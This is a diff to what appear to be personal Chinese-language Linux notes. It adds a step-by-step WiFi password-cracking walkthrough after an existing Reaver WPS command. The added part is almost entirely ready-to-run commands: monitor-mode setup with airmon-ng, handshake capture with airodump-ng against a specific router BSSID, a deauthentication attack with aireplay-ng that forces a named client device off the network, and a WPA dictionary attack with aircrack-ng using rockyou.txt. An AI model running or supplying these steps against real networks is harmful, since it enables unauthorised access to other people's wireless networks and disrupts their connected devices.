@@ -244,4 +244,36 @@ tty1~6不支持中文显示：
   使用Reaver破解无线网络的WPA密码
     在终端中执行下列命令，用你实际获取到的BSSID替换命令中的bssid：  reaver -i moninterface -b bssid -vv :
       sudo reaver -i mon0 -b 5C:63:BF:C4:A4:CE -vv 
+      
+破解WiFi密码测试过
+  下载字典文件/usr/share/wordlists/rockyou.txt
+  
+  断开连接的wifi
+    airmon-ng
+  选择并开启无线网卡的监控模式
+    airmon-ng start wlan0
+    
+  执行成功之后网卡接口变为wlan0mon；可以使用ifconfig命令查看
+  
+  查看wifi网络
+    airodump-ng wlan0mon
+  抓取握手包
+    airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 -w ~/ wlan0mon
+      -c指定频道号
+      –bssid指定路由器bssid
+      -w指定抓取的数据包保存位置
+  强制连接到wifi的设备重新连接路由器
+    aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon
+      -0表示发起deauthentication攻击
+      -a指定无线路由器BSSID
+      -c指定强制断开的设备
+    成功后会显示handshake BSSID
+  开始破解密码
+    aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap
+      -a2代表WPA的握手包
+      -b指定要破解的wifi BSSID。
+      -w指定字典文件
+      最后是抓取的包
+  等待完成
+
   
